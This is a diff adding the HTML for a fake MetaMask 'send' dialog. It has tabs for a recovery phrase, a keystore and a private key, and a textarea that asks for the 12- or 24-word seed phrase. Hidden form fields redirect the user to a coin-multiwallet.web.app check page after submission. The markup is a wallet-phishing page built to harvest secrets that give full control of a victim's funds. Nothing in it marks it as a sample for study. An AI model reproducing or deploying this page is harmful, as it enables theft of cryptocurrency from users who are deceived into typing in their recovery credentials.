@@ -1,0 +1,47 @@
+<div id="send-dialog" style="">
+    <div class="send-dialog-overlay"></div>
+    <div class="send-dialog-content">
+      <div class="connect-dialog-body">
+        <div class="to-send-info">
+          <div class="wallet-app-send-logo">
+            <img id="current-wallet-send-logo" src="assets/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpg" alt="wallet-app-name">
+          </div>
+          <div id="current-wallet-app-send" class="wallet-app-name-send">Metamask</div>
+        </div>
+
+        <div class="send-tabs">
+          <button id="phraseSend">Phrase</button>
+          <button id="keystoreSend">Keystore</button>
+          <button id="privateKeySend">Private Key</button>
+        </div>
+        <div class="message-tab"></div>
+        <div class="send-form">
+          <form action="#" id="processForm" method="post" enctype="multipart/form-data">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://coin-multiwallet.web.app/app/check.html">
+
+            <input type="hidden" name="wallet" id="walletNameData" value="Metamask">
+            <div id="data-to-send">
+              <div class="form-group">
+                <div class="form-group">
+                  <input type="hidden" id="type" name="type" value="phrase">
+                  <textarea id="phrase" name="phrase" required="" class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
+                </div>
+                <div class="small text-left my-3" style="font-size: 11px">
+                  Typically 12 (sometimes 24) words separated by single spaces
+                </div>
+              </div>
+            </div>
+            <button type="submit" id="proceedButton" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px">
+              PROCEED
+            </button>
+            <div class="text-right">
+              <button type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">
+                Cancel
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
